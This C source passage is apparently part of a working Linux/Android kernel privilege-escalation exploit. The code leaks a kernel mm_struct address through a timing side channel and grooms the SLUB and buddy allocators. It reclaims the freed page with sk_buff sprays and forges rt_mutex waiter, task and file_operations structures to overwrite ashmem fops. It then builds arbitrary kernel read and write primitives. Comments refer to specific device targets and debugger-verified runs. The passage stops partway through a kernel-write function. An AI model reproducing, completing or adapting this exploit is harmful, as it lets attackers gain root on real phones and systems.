static void pre_leak_slab_flush(void) {
  /* Flush cpu_partial and drain prepare_ctx markers BEFORE closing the
   * leaked mm_struct.  This way the leaked slab becomes fully empty
   * the instant memfd_leak closes; discard_slab fires on the same
   * put_cpu_partial -> unfreeze_partials path without an extra
   * scheduling round-trip.  No usleep/yield here — we want zero gap
   * between the close and the first skb-send that reclaims the page. */
  flush_mm_cpu_partial();
  release_prepare_drain_markers();
}

static void abort_prepare_kernel_page(void) {
  close_reclaim_sockets();
  if (post_ctx.mm_cnt > 0 && post_ctx.memfds[post_ctx.mm_cnt - 1] >= 0) {
    close(post_ctx.memfds[post_ctx.mm_cnt - 1]);
    post_ctx.memfds[post_ctx.mm_cnt - 1] = -1;
  }
  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    if (prepare_ctx.memfds[i] >= 0) {
      close(prepare_ctx.memfds[i]);
      prepare_ctx.memfds[i] = -1;
    }
    if (prepare_ctx.childs[i] > 0) {
      kill_child(prepare_ctx.childs[i]);
      prepare_ctx.childs[i] = -1;
    }
  }
  cleanup_page_prepare_state();
}

void prepare_ctxs(void) {
  prepare_ctx.mm_cnt = 32 * mm_objs_per_slab;
  prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
  prepare_ctx.memfds = calloc(sizeof(int), prepare_ctx.mm_cnt);

  spray_ctx.mm_cnt = (1 + MM_PARTIALS) * mm_objs_per_slab;
  spray_ctx.childs = calloc(sizeof(pid_t), spray_ctx.mm_cnt);
  spray_ctx.memfds = calloc(sizeof(int), spray_ctx.mm_cnt);

  pre_ctx.mm_cnt = mm_objs_per_slab - 1;
  pre_ctx.childs = calloc(sizeof(pid_t), pre_ctx.mm_cnt);
  pre_ctx.memfds = calloc(sizeof(int), pre_ctx.mm_cnt);

  post_ctx.mm_cnt = mm_objs_per_slab;
  post_ctx.childs = calloc(sizeof(pid_t), post_ctx.mm_cnt);
  post_ctx.memfds = calloc(sizeof(int), post_ctx.mm_cnt);
}

int prepare_skb_payload(uintptr_t base, int payload_mode) {
  memset(skb_buf, 0, SKB_SEND_SIZE);

  uintptr_t payload_base = base + SKB_DATA_DELTA;

  fake_lock = payload_base + LOCK_OFF;
  fake_w0 = payload_base + W0_OFF;
  fake_task = payload_base + FAKE_TASK_OFF;
  fake_fops = payload_base + FOPS_TABLE_OFF;
  if (payload_mode == PAGE_PAYLOAD_exp64) {
    /* Quest3/exp64 route (works on v5.10): no fake_w0 at all.  The write
     * comes from the stamped stale waiter's OWN tree_entry during the
     * chain walk's rt_mutex_dequeue(lock, waiter) (rtmutex.c step [7]):
     * rb_erase_cached sees pc=fake_fops(RED), rb_right=0, rb_left=target
     * → rb_set_parent(child=target, parent=fake_fops) writes
     * *target = fake_fops.  Collateral: __rb_change_child stores `target`
     * into fake_fops+0x08 (the "parent's" rb_right = fops .llseek slot),
     * repaired later by repair_fake_fops_llseek().  Hence the page only
     * needs: zeroed fake_lock, a detached fake_task, and the fops table. */
    binwrite_target = payload_base + SCRATCH_OFF;
    for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
      unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;

      /* fake_lock: all zero — wait_lock free, no owner, empty tree
       * (memset above already zeroed it). */

      /* fake_task: detached (pi_waiters empty), sane prio/usage so the
       * walk's try_to_wake_up(fake_task) bails on __state==0. */
      put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
      put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
      put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
      put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF,
            text_addr(ROOT_TASK_GROUP));
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF,
            text_addr(INIT_TASK));
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);

      /* fops table; .llseek MUST be 0 (sacrificed by the rb write). */
      put_fake_fops_table(p, FOPS_TABLE_OFF);
      put64(p, FOPS_TABLE_OFF + FOPS_LLSEEK_OFF, 0);
    }
    return 1;
  }
  if (payload_mode == PAGE_PAYLOAD_FOPS) {
    fake_parent = fake_fops;
    fake_right = data_addr(ASHMEM_MISC_FOPS);
    fake_left = 0;
    binwrite_target = payload_base + SCRATCH_OFF;
  } else {
    fake_parent = data_addr(ASHMEM_MISC_FOPS) - 8;
    fake_right = fake_fops;
    fake_left = payload_base + LEFT_OFF;
    binwrite_target = payload_base + FOPS_OFF + 0x700;
  }

#ifdef SLIDE_RECLAIM_SCAN_PHASE
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
      unsigned char *p = skb_buf + chunk;
      for (size_t off = SLIDE_RECLAIM_SCAN_PHASE;
           off + 0x20 <= ORDER3_SIZE; off += 0x20) {
        put64(p, off + 0x08, 0x4141000000000000ULL | off);
      }
    }
    return 1;
  }
#endif

  /* FOPS mode: one-child rb_erase at pi_tree_entry writes fake_fops to
   * ASHMEM_MISC_FOPS:  parent = ASHMEM_MISC_FOPS-8 → __rb_change_child()
   * stores the child (fake_fops) into parent->rb_right (= target).
   * color MUST be RED (0): a BLACK erased node would make __rb_erase_color
   * walk ashmem_misc/fake_fops as rb nodes (rotate/recolor garbage).
   *
   * v5.10 geometry (rtmutex.c:721 dequeue + :722 enqueue):
   *  - rb_left=fake_fops / rb_right=0: rb_erase takes the one-child path
   *    with child=fake_fops (the write value).  rb_next(fake_w0) then has
   *    rb_right==0 and walks UP to parent=ASHMEM_MISC_FOPS-8, returning it
   *    as the new cached leftmost — it never descends into the fops table.
   *  - fake_task->pi_waiters.rb_node stays NULL (detached root, see below),
   *    so the post-write rt_mutex_enqueue_pi(stale) inserts into an EMPTY
   *    tree: parent==NULL → node colored BLACK → break.  Zero fixup
   *    iterations, zero recolors/rotations touching the fops table —
   *    .owner survives as fake_w0|1 and try_module_get() at open() passes
   *    (a fixup recolor to (fake_w0+0x18)|1 made module->state read the
   *    pi_tree_entry self-pointer → ENODEV, observed on the live target). */
  uintptr_t write_pc = (data_addr(ASHMEM_MISC_FOPS) - 8); /* color=RED */
  uintptr_t write_right = 0;
  uintptr_t write_left = fake_fops;
  uint64_t waiter_task = text_addr(INIT_TASK);
  uint64_t task_group = text_addr(ROOT_TASK_GROUP);
  uint64_t pi_top_task = text_addr(INIT_TASK);
  uint32_t waiter_prio = FAKE_WAITER_PRIO;
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    write_pc = SLIDE_LOGGERS_0_1 + slide_p0_offset;
    write_right = 0;
    write_left = SLIDE_RANDOM_BOOT_ID_DATA + slide_p0_offset;
#if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
    waiter_task = fake_task;
    task_group = 0;
    pi_top_task = fake_task;
#else
    waiter_task = SLIDE_INIT_TASK + slide_p0_offset;
    task_group = SLIDE_ROOT_TASK_GROUP + slide_p0_offset;
    pi_top_task = SLIDE_INIT_TASK + slide_p0_offset;
#endif
    waiter_prio = SLIDE_FAKE_WAITER_PRIO;
  }

  for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
    unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;

    put32(p, LOCK_OFF + 0x00, 0);
    if (payload_mode == PAGE_PAYLOAD_SLIDE) {
      put64(p, LOCK_OFF + 0x08, fake_w0);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      put64(p, LOCK_OFF + 0x18, SLIDE_LOCK_OWNER_VALUE);
    } else {
      put64(p, LOCK_OFF + 0x08, fake_w0);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      put64(p, LOCK_OFF + 0x18, fake_task | 1);
    }

    put64(p, W0_OFF + 0x00, 1);
    put64(p, W0_OFF + 0x08, 0);
    put64(p, W0_OFF + 0x10, 0);
    put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, waiter_prio);
    put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
    put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, waiter_prio);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
    put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
    put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
    put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
    put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);

    put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      /* Detached root: pi_waiters.rb_node = NULL, only the cached leftmost
       * points at the fake waiter.  rb_erase_cached() still runs rb_next +
       * rb_erase on it (node links are self-contained: parent = ASHMEM_MISC
       * _FOPS-8, rb_left = fake_fops), so the rb_write lands, but the tree
       * itself stays EMPTY — the post-write rt_mutex_enqueue_pi() then
       * inserts the stale waiter as root with parent==NULL, i.e. ZERO
       * rb_insert_color fixup iterations that would otherwise recolor/
       * rotate the fake fops table (its .owner got clobbered to
       * (fake_w0+0x18)|1 → try_module_get failure → ENODEV at open). */
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
    } else {
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
    }
    put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);

    put64(p, RIGHT_OFF + 0x00, fake_parent);
    put64(p, RIGHT_OFF + 0x08, 0);
    put64(p, RIGHT_OFF + 0x10, 0);

    put64(p, LEFT_OFF + 0x00, fake_parent);
    put64(p, LEFT_OFF + 0x08, 0);
    put64(p, LEFT_OFF + 0x10, 0);

    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      put_fake_fops_table(p, FOPS_TABLE_OFF);
    }
  }
  return 1;
}

uintptr_t prepare_kernel_page(int payload_mode) {
  reclaim_batch_next();   /* never close the previous batch: see reclaim_sv */
  mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
  prepare_ctxs();

  skb_buf = malloc(SKB_SEND_SIZE);
  memset(skb_buf, 0x41, SKB_SEND_SIZE);

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.childs[i] = clone_child();
  }
  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
  }

  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    spray_ctx.childs[i] = clone_child();
    spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
  }

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  int ks_verbose = env_int_range("KERNELSNITCH_VERBOSE", 0, 0, 1);
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, ks_verbose, 0);

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.childs[i] = clone_child();
  }
  child_leak = clone_leak_child();
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.childs[i] = clone_child();
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
  }
  memfd_leak = open_memfd(child_leak);
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    kill_child(pre_ctx.childs[i]);
  }
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    kill_child(post_ctx.childs[i]);
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    kill_child(spray_ctx.childs[i]);
  }
  /* Kill the prepare children early too: their mm_structs must be
   * pinned solely by the memfds (refcount 1) so that closing a
   * prepare memfd below actually frees the mm_struct — the v5.10
   * cpu_partial drain before close(memfd_leak) depends on it. */
  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    kill_child(prepare_ctx.childs[i]);
    prepare_ctx.childs[i] = -1;
  }
  SYSCHK(waitpid(child_leak, NULL, 0));

  if (!kernelsnitch_found_collisions(ks)) {
    pr_warning("KernelSnitch collision finding failed\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  kernelsnitch_bruteforce(ks);
  uintptr_t leaked = ks->mm_struct;
  if (leaked == (uintptr_t)-1) {
    pr_warning("KernelSnitch mm_struct leak failed\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
  last_leaked_mm = leaked;
  pr_info("mm leaked=%016zx base=%016zx object_index=%zu\n",
          leaked, base, (leaked - base) / MM_STRUCT_SZ);
  if (!prepare_skb_payload(base, payload_mode)) {
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  const int oppo_teardown = use_oppo_reclaim_teardown();
  if (oppo_teardown) {
    pr_info("mm reclaim teardown: oppo-ghostlock profile\n");
  }

  if (oppo_teardown) {
    SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv[rb_cur][0]));
    int sndbuf = 1 << 20;
    setsockopt(reclaim_sv[rb_cur][0][0], SOL_SOCKET, SO_SNDBUF, &sndbuf,
               sizeof(sndbuf));
    int reclaim_flags = fcntl(reclaim_sv[rb_cur][0][0], F_GETFL, 0);
    if (reclaim_flags >= 0) {
      fcntl(reclaim_sv[rb_cur][0][0], F_SETFL, reclaim_flags | O_NONBLOCK);
    }
  } else {
    init_reclaim_sv();
    int sndbuf = 1 << 20;
    for (int p = 0; p < SKB_RECLAIM_PAIRS; p++) {
      SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv[rb_cur][p]));
      setsockopt(reclaim_sv[rb_cur][p][0], SOL_SOCKET, SO_SNDBUF, &sndbuf,
                 sizeof(sndbuf));
      int reclaim_flags = fcntl(reclaim_sv[rb_cur][p][1], F_GETFL, 0);
      if (reclaim_flags >= 0) {
        fcntl(reclaim_sv[rb_cur][p][1], F_SETFL, reclaim_flags | O_NONBLOCK);
      }
    }
  }
  int pcp_shaping_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  size_t send_sz = oppo_teardown ? (size_t)SKB_SEND_SIZE : skb_send_bytes();
  last_skb_send_size = send_sz;

  iov.iov_base = skb_buf;
  iov.iov_len = send_sz;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));

  pin_to_core(CORE);
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  track_mm_page(base, "pre-close");
  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    SYSCHK(close(pre_ctx.memfds[i]));
    pre_ctx.memfds[i] = -1;
  }
  if (oppo_teardown) {
    for (size_t i = 0; i < post_ctx.mm_cnt - 1; i++) {
      SYSCHK(close(post_ctx.memfds[i]));
      post_ctx.memfds[i] = -1;
    }
    if (use_skb_close_last_mm()) {
      size_t last = post_ctx.mm_cnt - 1;
      if (post_ctx.memfds[last] >= 0) {
        SYSCHK(close(post_ctx.memfds[last]));
        post_ctx.memfds[last] = -1;
        pr_info("mm reclaim: SKB_CLOSE_LAST_MM=1 (closed post_ctx[last])\n");
      }
    }
  } else {
    for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
      SYSCHK(close(post_ctx.memfds[i]));
      post_ctx.memfds[i] = -1;
    }
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
    SYSCHK(close(spray_ctx.memfds[i]));
    spray_ctx.memfds[i] = -1;
  }
  track_mm_page(base, "markers-closed");

  SYSCHK(close(pcp_shaping_sv[0]));
  SYSCHK(close(pcp_shaping_sv[1]));

  /* --- v5.10 SLUB cpu_partial drain --------------------------------
   * The pre/post/marker closes above left the leaked slab FROZEN on
   * this CPU's SLUB cpu_partial list with inuse=1.  On v5.10 a plain
   * object free can NEVER discard a frozen slab (__slab_free takes the
   * FREE_FROZEN path and never calls discard_slab), so the leak slab
   * only reaches buddy once it is (a) empty AND (b) moved to the NODE
   * partial list by unfreeze_partials with nr_partial >= min_partial(5).
   *
   * The drain must therefore run AFTER close(memfd_leak) empties the
   * slab (the upstream/S25U ordering): close(memfd_leak) drops the slab
   * to inuse=0 while frozen, then the late drain below forces
   * unfreeze_partials, which moves the frozen+empty slab to the node
   * partial list and discards it.  Draining BEFORE the close (the
   * earlier reorder) unfreezes the slab while it still holds its one
   * live object, so the slab is parked on the node partial list and the
   * final free never discards — the page never reaches buddy
   * (GDB-verified on b0q: zero discard_slab hits).
   * ---------------------------------------------------------------- */
  if (!oppo_teardown)
    log_mm_slabinfo("before-leak-close");

  /* enable trace BEFORE the close so trace_marker doesn't schedule
   * between close and first sendmsg */
  page_reclaim_trace_begin();

  /* Warm cpu_slab + flood (legacy oppo/v6.x profile only). */
  enum { WARM_N = MM_CPU_PARTIAL + 2 };
  int warm_fds[WARM_N];
  size_t wn = 0;
  if (oppo_teardown) {
    for (; wn < WARM_N; wn++) {
      warm_fds[wn] = clone_memfd();
      if (warm_fds[wn] < 0) break;
    }
    for (int i = 0; i < 200; i++) {
      int fd = clone_memfd();
      if (fd < 0) break;
      SYSCHK(close(fd));
    }
  }

  /* Step 1: close the leaked mm_struct.  The pre/post closes above left
   * the leak slab FROZEN on this CPU's SLUB cpu_partial list with
   * inuse=1, so this last free takes the FREE_FROZEN path — the slab
   * drops to inuse=0 but is NOT discarded (v5.10 never discards a
   * frozen slab from __slab_free). */
  SYSCHK(close(memfd_leak));
  memfd_leak = -1;
  track_mm_page(base, "leak-closed");

  /* Order-0 prefill must land AFTER the leak close and BEFORE the drain
   * below triggers discard_slab: it keeps the buddy's order-0 lists stocked
   * so the order-3 leak page survives whole until the skb frags take it. */
  if (!oppo_teardown)
    prefill_order0_buddy();

  /* Hold a pile of order-3 skb frag pages so free_area[3][UNMOVABLE] is
   * short when the drain below discards the leak page (see order3_hold_begin). */
  if (!oppo_teardown)
    order3_hold_begin(&msg);

  /* Step 2: late drain.  Free one object from each still-full
   * prepare_ctx slab (stride = objects/slab) so put_cpu_partial(drain=1)
   * overflows the frozen chain past cpu_partial(13) and runs
   * unfreeze_partials AFTER the leak slab is empty.  The frozen+empty
   * leak slab then moves to the NODE partial list where
   * discard_slab() fires (inuse==0 && nr_partial >= min_partial(5))
   * and its order-3 page lands on buddy free_area[3] — exactly the
   * upstream (S25U) ordering; the earlier drain-first reorder left the
   * leak slab stranded frozen+empty (GDB-verified: zero discard_slab
   * hits, page never reaches buddy).
   * No mm_struct allocation may happen between step 1 and the sends —
   * a fresh mm alloc could reactivate the leak slab as cpu_slab. */
  if (!oppo_teardown) {
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i += mm_objs_per_slab) {
      if (prepare_ctx.memfds[i] >= 0) {
        SYSCHK(close(prepare_ctx.memfds[i]));
        prepare_ctx.memfds[i] = -1;
      }
    }
  }
  /* NO track_mm_page("drained") here: the call's tracefs open does a zeroed
   * order-3 kmalloc that steals the just-discarded leak page before the
   * sends can capture it (see use_mm_track).  The drained-state read is
   * emitted post-capture instead (below, next to "sent"). */

  /* Clean up the warm mm_structs (oppo profile only). */
  for (size_t i = 0; i < wn; i++)
    SYSCHK(close(warm_fds[i]));

  /* Hold-all (default, IonStackQuest3 semantics): every reclaim skb stays
   * QUEUED on its pair through the cfi/pipe stages, so every order-3 page
   * the sends captured — the leak page among them — keeps its payload until
   * close_reclaim_sockets() at the next prepare.  The old drain-cycling
   * (SKB_DRAIN_SENDS=1) freed each skb right after receipt and pinned only
   * one final head page; with b0q's tail-insert/shuffle buddy frees the
   * leak page usually sat mid-list and was never captured — the payload
   * never landed, the page was recycled as live mm_structs by the exp64
   * child's own fork/exec churn, and the stale misc.fops then crashed
   * misc_open (GDB-verified 2026-08-07: 10/10 attempts missed, die at
   * misc_open+292 blr to junk f_op->open).  wmem_max (~208KB) caps each
   * pair at ~3 queued 64KB skbs, so hold mode defaults to 3 per pair. */
  int drain_sends = env_flag("SKB_DRAIN_SENDS", 0);
  int reclaim_want =
      env_int_range("PAGE_RECLAIM_SENDS",
                    drain_sends ? SKB_RECLAIM_SENDS : SKB_RECLAIM_PAIRS * 3,
                    1, 64);
  last_skb_reclaim_want = reclaim_want;
  int skb_sent = 0;
  if (oppo_teardown) {
    for (int i = 0; i < reclaim_want; i++) {
      errno = 0;
      ssize_t sent = sendmsg(reclaim_sv[rb_cur][0][0], &msg, MSG_DONTWAIT);
      int saved_errno = errno;
      pr_info("sk_buff reclaim send %d/%d ret=%zd errno=%d\n",
              i + 1, reclaim_want, sent, saved_errno);
      if (sent > 0) {
        skb_sent++;
      } else {
        break;
      }
    }
  } else if (drain_sends) {
    for (int i = 0; i < reclaim_want; i++) {
      int pair = i % SKB_RECLAIM_PAIRS;
      errno = 0;
      ssize_t sent = sendmsg(reclaim_sv[rb_cur][pair][0], &msg, 0);
      if (sent > 0) {
        skb_sent++;
        drain_reclaim_pair(pair);
        continue;
      }
      if (errno == EAGAIN || errno == EWOULDBLOCK) {
        drain_reclaim_pair(pair);
        errno = 0;
        sent = sendmsg(reclaim_sv[rb_cur][pair][0], &msg, MSG_DONTWAIT);
        if (sent > 0) {
          skb_sent++;
          drain_reclaim_pair(pair);
        }
      }
    }
  } else {
    /* Hold-all: queue each skb undrained.  Round-robin over the pairs;
     * a full pair reports EAGAIN (MSG_DONTWAIT) — the pairs fill evenly,
     * so the first failure means every pair is at capacity. */
    for (int i = 0; i < reclaim_want; i++) {
      int pair = i % SKB_RECLAIM_PAIRS;
      ssize_t sent = sendmsg(reclaim_sv[rb_cur][pair][0], &msg, MSG_DONTWAIT);
      if (sent <= 0)
        break;
      skb_sent++;
    }
  }
  page_reclaim_trace_end();
  last_skb_reclaim_sent = skb_sent;

  /* Stability hold (drain-cycling mode only): leave one payload skb queued
   * (undrained) so the reclaimed page_base stays allocated through the
   * pselect/cfi/pipe stages.  Without this the page floats in the buddy
   * allocator and the pipe prepare child's sprays reclaim it — clobbering
   * the fake fops table (arb-r/w then reads 0, or CFI panics on close).
   * The send re-sprays the same payload, so page_base keeps valid contents.
   * Hold-all mode needs no separate hold: every queued skb is a hold. */
  if (!oppo_teardown && drain_sends) {
    ssize_t held = sendmsg(reclaim_sv[rb_cur][0][0], &msg, MSG_DONTWAIT);
    if (held <= 0) {
      drain_reclaim_pair(0);
      held = sendmsg(reclaim_sv[rb_cur][0][0], &msg, MSG_DONTWAIT);
    }
    pr_info("mm skb reclaim hold=%zd (page pinned)\n", held);
  }
  /* The capture is secured (the reclaim batch holds the leak page), so the
   * absorb pile is released every round: keeping it pinned saturated the
   * pair table by round 3 and blew RLIMIT_NOFILE by round 8 (run 3).
   * The freed pile pages land at the free_area[3] tail and are re-absorbed
   * at the next round's order3_hold_begin(). */
  if (!oppo_teardown)
    order3_hold_end();
  track_mm_page(base, "drained");   /* post-capture: can only steal a */
  track_mm_page(base, "sent");      /* harmless split-remainder page   */

  pr_info("mm skb reclaim sends=%d/%d (pairs=%d%s)\n",
          skb_sent, reclaim_want,
          oppo_teardown ? 1 : SKB_RECLAIM_PAIRS,
          oppo_teardown ? " oppo" : (drain_sends ? " drain" : " hold"));

  if (!oppo_teardown && payload_mode == PAGE_PAYLOAD_FOPS &&
      !verify_fops_on_page(base)) {
    pr_warning("skb reclaim: fops signature missing at base %016zx\n", base);
    kernelsnitch_cleanup(ks);
    ks = NULL;
    abort_prepare_kernel_page();
    return 0;
  }

  kernelsnitch_cleanup(ks);
  ks = NULL;

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    if (prepare_ctx.memfds[i] >= 0) {
      SYSCHK(close(prepare_ctx.memfds[i]));
      prepare_ctx.memfds[i] = -1;
    }
    if (prepare_ctx.childs[i] > 0) {
      kill_child(prepare_ctx.childs[i]);
      prepare_ctx.childs[i] = -1;
    }
  }

  return base;
}

uintptr_t prepare_good_kernel_page(int payload_mode) {
  int max_attempts = KERNEL_PAGE_SETUP_ATTEMPTS;
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    max_attempts = SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS;
  } else if (payload_mode == PAGE_PAYLOAD_FOPS ||
             payload_mode == PAGE_PAYLOAD_exp64) {
    max_attempts = FOPS_KERNEL_PAGE_SETUP_ATTEMPTS;
  }
  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    uintptr_t base = prepare_kernel_page(payload_mode);
    if (base) {
      return base;
    }
    pr_warning("prepare_kernel_page retry %d/%d\n", attempt,
               max_attempts);
  }
  pr_warning("prepare_kernel_page did not find usable nonzero source pointers\n");
  return 0;
}

ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
  /* Keep bin_buffer's low 24 bits zero: the multi-pass SET_NAME writes the
   * blob via strscpy(), which copies word-at-a-time and zero-masks every
   * byte to the word end after each NUL (blob zero position).  Passes for
   * blob zeros at [69..73] (needs_read_fill/read_in_progress) therefore
   * wipe dest[74..79] = bin_buffer's low bytes.  With an aligned pointer
   * those bytes are already 0, the wipe is a no-op, and the real offset
   * rides in *ppos. */
  off_t pos = (off_t)(target & 0xffffffULL);
  uintptr_t aligned = target - (uintptr_t)pos;
  put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, aligned);
  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN,
        (uint32_t)((uint64_t)pos + len));
  put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }

  errno = 0;
  ssize_t wr = pwrite(fd, data, len, pos);
  return wr;
}

ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
  /* Keep buffer->page's low 24 bits zero (see configfs_write_once): the
   * strscpy word-mask from the blob zeros at [0..4] would otherwise wipe
   * the page pointer's low bytes.  Aligned pointer + real offset in *ppos
   * makes the wipe a no-op. */
  off_t pos = (off_t)(target & 0xffffffULL);
  uintptr_t page = target - (uintptr_t)pos;
  put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, page);
  put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }

  errno = 0;
  ssize_t rd = pread(fd, data, len, pos);
  return rd;
}

int is_direct_ptr(uintptr_t value) {
  return value >= DIRECT_MAP_BASE && value < DIRECT_MAP_END;
}

int is_kernel_ptr(uintptr_t value) {
  return value >= 0xffff800000000000ULL;
}

uint64_t kernel_read64(int fd, uintptr_t target) {
  uint64_t value = 0;
  ssize_t n = kernel_read_data(fd, target, &value, sizeof(value));
  if (n != (ssize_t)sizeof(value)) {
    return 0;
  }
  return value;
}

ssize_t kernel_write_data(int fd, uintptr_t target, const void *data, size_t len) {
